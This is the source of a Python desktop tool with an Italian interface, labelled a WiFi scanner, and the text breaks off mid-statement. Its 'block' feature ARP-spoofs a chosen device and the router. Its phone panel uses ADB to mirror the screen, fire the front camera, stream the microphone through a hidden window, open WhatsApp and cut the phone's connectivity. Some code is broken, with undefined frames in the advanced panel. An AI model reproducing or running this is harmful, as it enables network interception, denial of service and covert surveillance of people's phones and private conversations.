import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading
import socket
import re
import os
from datetime import datetime

BG      = "#0d1117"
SURFACE = "#161b22"
BORDER  = "#30363d"
ACCENT  = "#58a6ff"
GREEN   = "#3fb950"
YELLOW  = "#d29922"
RED     = "#f85149"
TEXT    = "#e6edf3"
MUTED   = "#8b949e"

blocked_threads = {}
SCRCPY_DIR  = os.path.join(os.path.expanduser("~"), "Desktop", "scrcpy-win64-v3.3.4")
SCRCPY_PATH = os.path.join(SCRCPY_DIR, "scrcpy.exe")
ADB_PATH    = os.path.join(SCRCPY_DIR, "adb.exe")

def get_gateway():
    try:
        out = subprocess.check_output("ipconfig", text=True)
        for line in out.splitlines():
            if "Gateway" in line or "gateway" in line:
                m = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                if m:
                    return m.group(1)
    except:
        pass
    return None

def arp_spoof_loop(target_ip, gateway_ip, stop_event):
    try:
        from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf, srp
        iface = conf.iface
        my_mac = get_if_hwaddr(iface)
        def resolve(ip):
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            return None
        target_mac  = resolve(target_ip)
        gateway_mac = resolve(gateway_ip)
        if not target_mac or not gateway_mac:
            return
        pkt_t = Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip,  hwsrc=my_mac)
        pkt_g = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,   hwsrc=my_mac)
        while not stop_event.is_set():
            sendp(pkt_t, iface=iface, verbose=0)
            sendp(pkt_g, iface=iface, verbose=0)
            stop_event.wait(1.5)
        r_t = Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip,  hwsrc=gateway_mac)
        r_g = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,   hwsrc=target_mac)
        for _ in range(5):
            sendp(r_t, iface=iface, verbose=0)
            sendp(r_g, iface=iface, verbose=0)
    except ImportError:
        pass

def get_adb_serial(ip):
    try:
        out = subprocess.check_output([ADB_PATH, "devices"], text=True, timeout=5)
        serials = []
        for line in out.splitlines():
            if "	device" in line and "offline" not in line:
                serial = line.split()[0]
                if ip in serial:
                    return serial
                serials.append(serial)
        # verifica via ip route su ogni serial
        for serial in serials:
            try:
                info = subprocess.check_output(
                    [ADB_PATH, "-s", serial, "shell", "ip addr"],
                    text=True, timeout=5)
                if ip in info:
                    return serial
            except:
                pass
    except:
        pass
    return None

def adb_cmd(ip, *args):
    serial = get_adb_serial(ip)
    if serial:
        subprocess.run([ADB_PATH, "-s", serial, "shell"] + list(args), capture_output=True)

def open_gestisci(ip):
    serial = get_adb_serial(ip)
    already_connected = serial is not None

    win = tk.Toplevel()
    win.title(f"GESTISCI — {ip}")
    win.configure(bg=BG)
    win.resizable(False, False)
    win.grab_set()

    tk.Label(win, text="GESTISCI", font=("Courier New", 16, "bold"),
             bg=BG, fg=ACCENT).pack(pady=(20, 4))
    tk.Label(win, text=f"Dispositivo: {ip}",
             font=("Courier New", 10), bg=BG, fg=MUTED).pack()

    tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=14)

    # ── sezione connessione (mostrata solo se non connesso) ──
    conn_frame = tk.Frame(win, bg=BG)

    if not already_connected:
        win.geometry("560x780")
        tk.Label(conn_frame, text="Sul telefono:\nImpostazioni → Opzioni sviluppatore\n→ Debug wireless → Abbina dispositivo con codice",
                 font=("Courier New", 9), bg=BG, fg=MUTED, justify="center").pack(pady=(0,10))

        form = tk.Frame(conn_frame, bg=BG)
        form.pack(padx=24, fill="x")

        tk.Label(form, text="IP:PORTA pairing", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=0, column=0, sticky="w", pady=4)
        pair_addr = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        pair_addr.grid(row=0, column=1, padx=(8,0), pady=4)
        pair_addr.insert(0, f"{ip}:PORTA")

        tk.Label(form, text="Codice PIN", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=1, column=0, sticky="w", pady=4)
        pair_pin = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        pair_pin.grid(row=1, column=1, padx=(8,0), pady=4)

        tk.Label(form, text="Porta connessione", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=2, column=0, sticky="w", pady=4)
        conn_port = tk.Entry(form, font=("Courier New", 10), bg=SURFACE, fg=TEXT, insertbackground=TEXT, relief="flat", bd=4, width=22)
        conn_port.grid(row=2, column=1, padx=(8,0), pady=4)
        conn_port.insert(0, "es: 42345")

        status_lbl = tk.Label(conn_frame, text="", font=("Courier New", 9), bg=BG, fg=MUTED)
        status_lbl.pack(pady=4)

        def do_pair():
            addr = pair_addr.get().strip()
            pin  = pair_pin.get().strip()
            if not addr or not pin:
                status_lbl.configure(text="Inserisci IP:PORTA e PIN", fg=RED)
                return
            status_lbl.configure(text="Pairing in corso...", fg=YELLOW)
            win.update()
            proc = subprocess.run([ADB_PATH, "pair", addr, pin], capture_output=True, text=True, timeout=15)
            out = proc.stdout + proc.stderr
            if "success" in out.lower():
                status_lbl.configure(text="Pairing OK! Ora clicca Connetti.", fg=GREEN)
            else:
                status_lbl.configure(text=f"Errore: {out.strip()[:80]}", fg=RED)

        def do_connect():
            porta = conn_port.get().strip().split(":")[-1] or "5555"
            status_lbl.configure(text="Connessione...", fg=YELLOW)
            win.update()
            proc = subprocess.run([ADB_PATH, "connect", f"{ip}:{porta}"], capture_output=True, text=True, timeout=10)
            out = proc.stdout + proc.stderr
            if "connected" in out.lower():
                status_lbl.configure(text="Connesso!", fg=GREEN)
                win.update()
                conn_frame.pack_forget()
                action_frame.pack(pady=10)
                win.geometry("560x680")
            else:
                status_lbl.configure(text=f"Errore: {out.strip()[:80]}", fg=RED)

        pair_btn_frame = tk.Frame(conn_frame, bg=BG)
        pair_btn_frame.pack(pady=8)
        tk.Button(pair_btn_frame, text="1. ABBINA", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=16, pady=7,
                  cursor="hand2", command=do_pair).pack(side="left", padx=6)
        tk.Button(pair_btn_frame, text="2. CONNETTI", font=("Courier New", 10, "bold"),
                  bg=GREEN, fg=BG, relief="flat", padx=16, pady=7,
                  cursor="hand2", command=do_connect).pack(side="left", padx=6)

        conn_frame.pack(fill="x")
    else:
        win.geometry("560x680")

    # ── sezione azioni (sempre visibile se già connesso) ──
    action_frame = tk.Frame(win, bg=BG)

    def do_watch():
        s = get_adb_serial(ip)
        if s:
            subprocess.Popen([SCRCPY_PATH, "-s", s, "--video-bit-rate", "4M",
                                     "--max-fps", "30", "--max-size", "800",
                                     "--keyboard=uhid", "--stay-awake"], cwd=SCRCPY_DIR)

    def is_screen_on():
        try:
            out = subprocess.check_output([ADB_PATH, "-s", get_adb_serial(ip), "shell",
                "dumpsys power | grep mWakefulness"], capture_output=False, text=True, timeout=5)
            return "Awake" in out
        except:
            return True

    def toggle_screen():
        if is_screen_on():
            adb_cmd(ip, "input", "keyevent", "KEYCODE_POWER")
            auto_clear("Schermo spento", MUTED)
            screen_btn.configure(text="☀  ACCENDI", fg=YELLOW)
        else:
            adb_cmd(ip, "input", "keyevent", "KEYCODE_WAKEUP")
            auto_clear("Schermo acceso", GREEN)
            screen_btn.configure(text="🌙  SPEGNI", fg=MUTED)

    tk.Label(action_frame, text="Azioni disponibili:",
             font=("Courier New", 9), bg=BG, fg=MUTED).pack(pady=(0,8))

    row1 = tk.Frame(action_frame, bg=BG)
    row1.pack()

    def do_4k():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        # apri fotocamera frontale
        subprocess.run([ADB_PATH, "-s", s, "shell",
            "am start -a android.media.action.STILL_IMAGE_CAMERA_SECURE "
            "--ei android.intent.extras.CAMERA_FACING 1"], capture_output=True)
        import time; time.sleep(1)
        # scatta foto
        subprocess.run([ADB_PATH, "-s", s, "shell",
            "input keyevent KEYCODE_CAMERA"], capture_output=True)
        auto_clear("Foto scattata!", GREEN)

    tk.Button(row1, text="👁  WATCH", font=("Courier New", 11, "bold"),
              bg=ACCENT, fg=BG, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_watch).pack(side="left", padx=6)

    tk.Button(row1, text="📸  4K", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=GREEN, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_4k).pack(side="left", padx=6)

    row2 = tk.Frame(action_frame, bg=BG)
    row2.pack(pady=(8,0))

    # microfono live
    mic_proc = [None]
    def do_mic():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        if mic_proc[0] is not None:
            mic_proc[0].terminate()
            mic_proc[0] = None
            mic_btn.configure(text="🎤  MICROFONO", fg=MUTED)
            auto_clear("Microfono disattivato", MUTED)
            return
        # registra audio dal mic del telefono e lo riproduce sul pc
        # usa scrcpy audio per sentire il microfono in tempo reale
        p = subprocess.Popen(
            [SCRCPY_PATH, "-s", s, "--no-video", "--audio-source=mic", "--no-window"],
            cwd=SCRCPY_DIR, creationflags=subprocess.CREATE_NO_WINDOW)
        mic_proc[0] = p
        mic_btn.configure(text="🎤  STOP MIC", fg=RED)
        auto_clear("Microfono attivo — senti in cuffia/casse", GREEN)

        def watch_mic():
            import time
            p.wait()
            mic_proc[0] = None
            mic_btn.configure(text="🎤  MICROFONO", fg=MUTED)
            auto_clear("Microfono fermato", MUTED)
        threading.Thread(target=watch_mic, daemon=True).start()

    def do_apri_wg():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        # accendi schermo se spento
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        import time; time.sleep(0.5)
        # sblocca swipe
        subprocess.run([ADB_PATH, "-s", s, "shell", "input swipe 540 1600 540 800"], capture_output=True)
        time.sleep(0.5)
        # prova WhatsApp
        r = subprocess.run([ADB_PATH, "-s", s, "shell",
            "monkey -p com.whatsapp 1"], capture_output=True, text=True)
        if "No activities found" in r.stdout or "error" in r.stdout.lower():
            subprocess.run([ADB_PATH, "-s", s, "shell",
                "am start -a android.intent.action.VIEW -d https://www.google.com"],
                capture_output=True)
            auto_clear("WhatsApp non trovato, aperto Google", YELLOW)
        else:
            auto_clear("WhatsApp aperto!", GREEN)


    mic_btn = tk.Button(row2, text="🎤  MICROFONO", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=MUTED, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_mic)
    mic_btn.pack(side="left", padx=6)



    tk.Button(row2, text="🏠  HOME", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=MUTED, relief="flat", padx=18, pady=8,
              cursor="hand2", command=lambda: [
                  subprocess.run([ADB_PATH, "-s", get_adb_serial(ip), "shell",
                      "input keyevent KEYCODE_HOME"], capture_output=True),
                  auto_clear("Tornato a Home", GREEN)
              ]).pack(side="left", padx=6)

    tk.Button(row2, text="💬  APRI W/G", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=ACCENT, relief="flat", padx=18, pady=8,
              cursor="hand2", command=do_apri_wg).pack(side="left", padx=6)

    schermo_iniziale = is_screen_on()
    screen_btn = tk.Button(row1,
              text="🌙  SPEGNI" if schermo_iniziale else "☀  ACCENDI",
              font=("Courier New", 11),
              bg=SURFACE, fg=MUTED if schermo_iniziale else YELLOW,
              relief="flat", padx=18, pady=8,
              cursor="hand2", command=toggle_screen)
    screen_btn.pack(side="left", padx=6)

    # thread che aggiorna il tasto in base allo stato reale del telefono
    stop_monitor = threading.Event()
    def monitor_screen():
        import time
        last = schermo_iniziale
        while not stop_monitor.is_set() and win.winfo_exists():
            try:
                current = is_screen_on()
                if current != last:
                    last = current
                    if current:
                        screen_btn.configure(text="🌙  SPEGNI", fg=MUTED)
                    else:
                        screen_btn.configure(text="☀  ACCENDI", fg=YELLOW)
            except:
                pass
            time.sleep(0.2)
    t = threading.Thread(target=monitor_screen, daemon=True)
    t.start()
    def on_close():
        stop_monitor.set()
        if mic_proc[0] is not None:
            mic_proc[0].terminate()
            mic_proc[0] = None
        win.destroy()
    win.protocol("WM_DELETE_WINDOW", on_close)

    # sezione messaggio
    msg_frame = tk.Frame(action_frame, bg=BG)
    msg_frame.pack(pady=(8,0), padx=24, fill="x")

    msg_entry = tk.Entry(msg_frame, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=4)
    msg_entry.pack(side="left", fill="x", expand=True, padx=(0,8))
    msg_entry.insert(0, "Scrivi messaggio...")
    msg_entry.bind("<FocusIn>", lambda e: msg_entry.delete(0, "end") if msg_entry.get() == "Scrivi messaggio..." else None)

    def do_msg():
        s = get_adb_serial(ip)
        if not s:
            auto_clear("Dispositivo non connesso", RED)
            return
        testo = msg_entry.get().strip()
        if not testo or testo == "Scrivi messaggio...":
            auto_clear("Scrivi un messaggio!", RED)
            return
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f"am broadcast -a android.intent.action.BOOT_COMPLETED"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am start -n com.android.settings/.Settings'], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'service call notification 1 s16 "{testo}"'], capture_output=True)
        # toast via shell
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am broadcast -a android.provider.Telephony.SMS_RECEIVED '
            f'--es "sms_body" "{testo}"'], capture_output=True)
        # metodo piu affidabile: overlay
        # crea pagina HTML con messaggio e aprila nel browser
        escaped_html = testo.replace("'", "\'").replace('"', '&quot;').replace('<', '&lt;')
        html = (
            f"data:text/html,<html><body style='background:%23111;display:flex;"
            f"align-items:center;justify-content:center;height:100vh;margin:0;'>"
            f"<div style='background:%23222;color:white;font-size:2em;padding:40px;"
            f"border-radius:20px;text-align:center;font-family:sans-serif;"
            f"box-shadow:0 0 40px %23000;max-width:80%25;'>{escaped_html}</div></body></html>"
        )
        subprocess.run([ADB_PATH, "-s", s, "shell", "input keyevent KEYCODE_WAKEUP"], capture_output=True)
        subprocess.run([ADB_PATH, "-s", s, "shell",
            f'am start -n com.android.chrome/com.google.android.apps.chrome.Main '
            f'-a android.intent.action.VIEW -d "{html}"'],
            capture_output=True)
        auto_clear(f"Messaggio inviato: {testo[:30]}", GREEN)

    tk.Button(msg_frame, text="INVIA", font=("Courier New", 10, "bold"),
              bg=GREEN, fg=BG, relief="flat", padx=12, pady=4,
              cursor="hand2", command=do_msg).pack(side="left")

    action_status = tk.Label(action_frame, text="", font=("Courier New", 9),
                             bg=BG, fg=MUTED)
    action_status.pack(pady=6)

    def clear_status():
        action_status.configure(text="")
    
    # pulisce status dopo 2 secondi
    def auto_clear(msg, color):
        action_status.configure(text=msg, fg=color)
        win.after(2000, clear_status)

    tk.Frame(action_frame, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(12,6))

    def open_avanzate():
        s = get_adb_serial(ip)
        if not s:
            messagebox.showerror("Errore", "Dispositivo non connesso.")
            return
        aw = tk.Toplevel()
        aw.title(f"AVANZATE — {ip}")
        aw.geometry("620x560")
        aw.configure(bg=BG)
        aw.resizable(True, True)
        canvas = tk.Canvas(aw, bg=BG, highlightthickness=0)
        vsb = ttk.Scrollbar(aw, orient="vertical", command=canvas.yview)
        sf = tk.Frame(canvas, bg=BG)
        sf.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0,0), window=sf, anchor="nw")
        canvas.configure(yscrollcommand=vsb.set)
        canvas.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        aw.bind("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1*(e.delta/120)), "units"))
        tk.Label(sf, text="AVANZATE", font=("Courier New", 16, "bold"), bg=BG, fg=RED).pack(pady=(16,2))
        tk.Label(sf, text=f"Dispositivo: {ip}", font=("Courier New", 10), bg=BG, fg=MUTED).pack()
        tk.Frame(sf, bg=BORDER, height=1).pack(fill="x", padx=24, pady=10)
        astatus = tk.Label(sf, text="", font=("Courier New", 9), bg=BG, fg=MUTED)
        def run(*cmd):
            subprocess.run([ADB_PATH, "-s", s, "shell"] + list(cmd), capture_output=True)
        def qrun(cmd_list, msg, color=GREEN):
            subprocess.run([ADB_PATH, "-s", s, "shell"] + cmd_list, capture_output=True)
            astatus.configure(text=msg, fg=color)
        # connettivita
        tk.Label(sf, text="CONNETTIVITA", font=("Courier New", 8, "bold"), bg=BG, fg=MUTED).pack(pady=(4,0))
        r1 = tk.Frame(sf, bg=BG); r1.pack(pady=4)
        wifi_on = [True]
        def toggle_wifi():
            run("svc wifi disable" if wifi_on[0] else "svc wifi enable")
            wifi_on[0] = not wifi_on[0]
            wb.configure(text="WIFI ON" if not wifi_on[0] else "WIFI OFF", fg=GREEN if not wifi_on[0] else RED)
            astatus.configure(text=f"WiFi {'off' if not wifi_on[0] else 'on'}", fg=MUTED)
        dati_on = [True]
        def toggle_dati():
            run("svc data disable" if dati_on[0] else "svc data enable")
            dati_on[0] = not dati_on[0]
            db.configure(text="DATI ON" if not dati_on[0] else "DATI OFF", fg=GREEN if not dati_on[0] else RED)
            astatus.configure(text=f"Dati {'off' if not dati_on[0] else 'on'}", fg=MUTED)
        aereo_on = [False]
        def toggle_aereo():
            val = "1" if not aereo_on[0] else "0"
            run(f"settings put global airplane_mode_on {val}")
            run("am broadcast -a android.intent.action.AIRPLANE_MODE")
            aereo_on[0] = not aereo_on[0]
            aeb.configure(text="AEREO OFF" if aereo_on[0] else "AEREO ON", fg=RED if aereo_on[0] else MUTED)
            astatus.configure(text=f"Aereo {'on' if aereo_on[0] else 'off'}", fg=MUTED)
        wb = tk.Button(r1, text="WIFI OFF", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_wifi)
        wb.pack(side="left", padx=4)
        db = tk.Button(r1, text="DATI OFF", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_dati)
        db.pack(side="left", padx=4)
        aeb = tk.Button(r1, text="AEREO ON", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2", command=toggle_aereo)
        aeb.pack(side="left", padx=4)
        # volume e luce
        tk.Button(r2, text="VOL ZERO", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["cmd", "media_session", "volume", "--set", "0"], "Volume zero!")).pack(side="left", padx=4)
        tk.Button(r2, text="LUCE MAX", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["settings", "put", "system", "screen_brightness", "255"], "Luminosita massima!")).pack(side="left", padx=4)
        tk.Button(r2, text="LUCE MIN", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: [run("settings", "put", "system", "screen_brightness_mode", "0"),
                                   qrun(["settings", "put", "system", "screen_brightness", "1"], "Luminosita minima!")]).pack(side="left", padx=4)
        # sistema
        tk.Button(r3, text="CHIUDI PLAY", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["am", "force-stop", "com.android.vending"], "Play Store chiuso!")).pack(side="left", padx=4)
        tk.Button(r3, text="CHIUDI CHROME", font=("Courier New", 10, "bold"), bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["am", "force-stop", "com.android.chrome"], "Chrome chiuso!")).pack(side="left", padx=4)
        tk.Button(r3, text="CACHE", font=("Courier New", 10, "bold"), bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6, cursor="hand2",
                  command=lambda: qrun(["pm", "trim-caches", "1000000000"], "Cache pulita!")).pack(side="left", padx=4)
        # sveglia

        tk.Button(sf, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=aw.destroy).pack(pady=(0,16))
        astatus.pack(pady=4)

    tk.Button(action_frame, text="⚡  AVANZATE", font=("Courier New", 11, "bold"),
              bg=SURFACE, fg=RED, relief="flat", padx=20, pady=8,
              cursor="hand2", command=open_avanzate).pack(pady=4)

    tk.Button(action_frame, text="Chiudi", font=("Courier New", 10),
              bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
              cursor="hand2", command=win.destroy).pack(pady=(4,0))
    if already_connected:
        action_frame.pack(pady=10)


class WifiScanner(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("WiFi Scanner")
        self.geometry("960x580")
        self.resizable(True, True)
        self.configure(bg=BG)
        self.devices = []
        self._build_ui()

    def _build_ui(self):
        hdr = tk.Frame(self, bg=BG)
        hdr.pack(fill="x", padx=24, pady=(20, 0))

        tk.Label(hdr, text="WIFI SCANNER", font=("Courier New", 20, "bold"),
                 bg=BG, fg=ACCENT).pack(side="left")

        self.status_dot = tk.Label(hdr, text="●", font=("Courier New", 14), bg=BG, fg=MUTED)
        self.status_dot.pack(side="left", padx=(12, 4))

        self.status_lbl = tk.Label(hdr, text="in attesa...", font=("Courier New", 11), bg=BG, fg=MUTED)
        self.status_lbl.pack(side="left")

        self.count_lbl = tk.Label(hdr, text="", font=("Courier New", 11, "bold"), bg=BG, fg=GREEN)
        self.count_lbl.pack(side="right")

        info_frame = tk.Frame(self, bg=SURFACE, highlightthickness=1, highlightbackground=BORDER)
        info_frame.pack(fill="x", padx=24, pady=(12, 0))

        self.subnet_lbl = tk.Label(info_frame, text="Rete locale: rilevamento...",
                                   font=("Courier New", 10), bg=SURFACE, fg=MUTED, padx=12, pady=6)
        self.subnet_lbl.pack(side="left")

        self.time_lbl = tk.Label(info_frame, text="", font=("Courier New", 10), bg=SURFACE, fg=MUTED, padx=12, pady=6)
        self.time_lbl.pack(side="right")

        table_frame = tk.Frame(self, bg=BG)
        table_frame.pack(fill="both", expand=True, padx=24, pady=12)

        cols = ("ip", "hostname", "mac", "stato", "blocco")
        self.tree = ttk.Treeview(table_frame, columns=cols, show="headings", selectmode="browse")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background=SURFACE, foreground=TEXT, fieldbackground=SURFACE,
                        rowheight=36, borderwidth=0, font=("Courier New", 10))
        style.configure("Treeview.Heading", background=BG, foreground=MUTED,
                        font=("Courier New", 9, "bold"), relief="flat", borderwidth=0)
        style.map("Treeview", background=[("selected", "#1f2937")])

        headers = {"ip": ("IP ADDRESS", 160), "hostname": ("HOSTNAME", 220),
                   "mac": ("MAC ADDRESS", 160), "stato": ("STATO", 90), "blocco": ("BLOCCO", 90)}

        for col, (label, width) in headers.items():
            self.tree.heading(col, text=label)
            self.tree.column(col, width=width, anchor="w")

        vsb = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")

        self.tree.tag_configure("online",  foreground=GREEN)
        self.tree.tag_configure("blocked", foreground=RED)
        self.tree.tag_configure("self",    foreground=ACCENT)

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(fill="x", padx=24, pady=(0, 20))

        self.scan_btn = tk.Button(btn_frame, text="▶  SCANSIONA",
                                  font=("Courier New", 11, "bold"),
                                  bg=ACCENT, fg=BG, activebackground="#79c0ff",
                                  activeforeground=BG, relief="flat",
                                  padx=20, pady=8, cursor="hand2",
                                  command=self._start_scan)
        self.scan_btn.pack(side="left")

        self.block_btn = tk.Button(btn_frame, text="🔴  BLOCCA",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=RED, activebackground=BORDER,
                                   relief="flat", padx=20, pady=8, cursor="hand2",
                                   command=self._toggle_block)
        self.block_btn.pack(side="left", padx=(10, 0))





        self.gestisci_btn = tk.Button(btn_frame, text="⚙  GESTISCI",
                                   font=("Courier New", 11),
                                   bg=SURFACE, fg=YELLOW, activebackground=BORDER,
                                   relief="flat", padx=20, pady=8, cursor="hand2",
                                   command=self._gestisci)
        self.gestisci_btn.pack(side="left", padx=(10, 0))

        self.export_btn = tk.Button(btn_frame, text="💾  ESPORTA",
                                    font=("Courier New", 11),
                                    bg=SURFACE, fg=TEXT, activebackground=BORDER,
                                    relief="flat", padx=20, pady=8, cursor="hand2",
                                    command=self._export)
        self.export_btn.pack(side="left", padx=(10, 0))

        self.progress = ttk.Progressbar(btn_frame, mode="indeterminate", length=120)
        self.progress.pack(side="right")

        self.tree.bind("<<TreeviewSelect>>", self._on_select)
        self.after(400, self._start_scan)

    def _on_select(self, _=None):
        sel = self.tree.selection()
        if not sel:
            return
        ip = self.tree.item(sel[0])["values"][0]
        if ip in blocked_threads:
            self.block_btn.configure(text="🟢  SBLOCCA", fg=GREEN)
        else:
            self.block_btn.configure(text="🔴  BLOCCA", fg=RED)

    def _gestisci(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        ip = self.tree.item(sel[0])["values"][0]
        tags = self.tree.item(sel[0])["tags"]
        tag  = tags[0] if tags else ""
        if tag == "self":
            messagebox.showinfo("Gestisci", "Questo e il tuo stesso PC!")
            return
        open_gestisci(ip)

    def _toggle_block(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        item = sel[0]
        vals = list(self.tree.item(item)["values"])
        ip   = vals[0]
        tags = self.tree.item(item)["tags"]
        tag  = tags[0] if tags else ""
        if tag == "self":
            messagebox.showwarning("Attenzione", "Non puoi bloccare il tuo stesso PC!")
            return
        if ip in blocked_threads:
            blocked_threads[ip]["stop"].set()
            blocked_threads.pop(ip, None)
            vals[3] = "online"; vals[4] = "—"
            self.tree.item(item, values=vals, tags=("online",))
            self.block_btn.configure(text="🔴  BLOCCA", fg=RED)
            self._set_status(f"Sbloccato: {ip}", GREEN)
        else:
            gw = get_gateway()
            if not gw:
                messagebox.showerror("Errore", "Impossibile rilevare il gateway.")
                return
            stop_event = threading.Event()
            t = threading.Thread(target=arp_spoof_loop, args=(ip, gw, stop_event), daemon=True)
            t.start()
            blocked_threads[ip] = {"stop": stop_event, "thread": t}
            vals[3] = "BLOCCATO"; vals[4] = "●"
            self.tree.item(item, values=vals, tags=("blocked",))
            self.block_btn.configure(text="🟢  SBLOCCA", fg=GREEN)
            self._set_status(f"Bloccato: {ip}", RED)

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def _get_subnet(self, ip):
        return ".".join(ip.split(".")[:3]) + ".0/24"

    def _arp_scan(self, subnet):
        devices = {}
        my_ip = self._get_local_ip()
        def ping(ip):
            subprocess.run(["ping", "-n", "1", "-w", "300", ip], capture_output=True)
        base = ".".join(subnet.split(".")[:3])
        threads = []
        for i in range(1, 255):
            t = threading.Thread(target=ping, args=(f"{base}.{i}",), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        arp = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for line in arp.stdout.splitlines():
            m = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([\w-]{17})", line)
            if m:
                ip, mac = m.group(1), m.group(2).upper()
                if "FF-FF-FF-FF-FF-FF" in mac:
                    continue
                is_blocked = ip in blocked_threads
                tag = "blocked" if is_blocked else ("self" if ip == my_ip else "online")
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = "—"
                devices[ip] = {"ip": ip, "hostname": hostname, "mac": mac,
                               "stato": "BLOCCATO" if is_blocked else "online",
                               "blocco": "●" if is_blocked else "—", "tag": tag}
        if my_ip and my_ip not in devices:
            try:
                hostname = socket.gethostname()
            except:
                hostname = "questo PC"
            devices[my_ip] = {"ip": my_ip, "hostname": hostname, "mac": "—",
                               "stato": "online", "blocco": "—", "tag": "self"}
        return list(devices.values())

    def _start_scan(self):
        self.scan_btn.configure(state="disabled")
        self.progress.start(10)
        self._set_status("scansione in corso...", YELLOW)
        for row in self.tree.get_children():
            self.tree.delete(row)
        threading.Thread(target=self._scan_thread, daemon=True).start()

    def _scan_thread(self):
        my_ip = self._get_local_ip()
        if not my_ip:
            self.after(0, lambda: self._scan_done([], error="Nessuna connessione rilevata"))
            return
        subnet = self._get_subnet(my_ip)
        self.after(0, lambda: self.subnet_lbl.configure(
            text=f"Rete locale: {subnet}  |  Il tuo IP: {my_ip}"))
        devices = self._arp_scan(subnet)
        self.devices = devices
        self.after(0, lambda: self._scan_done(devices))

    def _scan_done(self, devices, error=None):
        self.progress.stop()
        self.scan_btn.configure(state="normal")
        self.time_lbl.configure(text=f"Ultima scansione: {datetime.now().strftime('%H:%M:%S')}")
        if error:
            self._set_status(error, RED)
            return
        devices.sort(key=lambda d: list(map(int, d["ip"].split("."))))
        for d in devices:
            self.tree.insert("", "end",
